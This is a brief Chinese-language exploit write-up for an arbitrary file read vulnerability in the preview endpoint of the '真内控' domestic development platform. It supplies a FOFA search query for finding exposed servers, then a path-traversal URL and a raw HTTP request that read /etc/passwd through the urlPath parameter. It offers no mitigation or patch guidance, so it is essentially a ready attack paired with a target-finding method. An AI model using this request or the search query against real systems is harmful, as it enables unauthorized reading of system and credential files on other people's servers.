## 真内控国产化开发平台简介

真内控国产化开发平台

## 漏洞描述

真内控国产化开发平台preview接口存在任意文件读取漏洞

## 影响版本

真内控国产化开发平台

## fofa查询语句

body="js/npm.echarts.js"

## 漏洞复现

漏洞链接：http://xxx.xx.xx.xx/print/billPdf/preview?urlPath=../../../../../../../../../../../../../../etc/passwd

```yaml
GET /print/billPdf/preview?urlPath=../../../../../../../../../../../../../../etc/passwd HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive

```

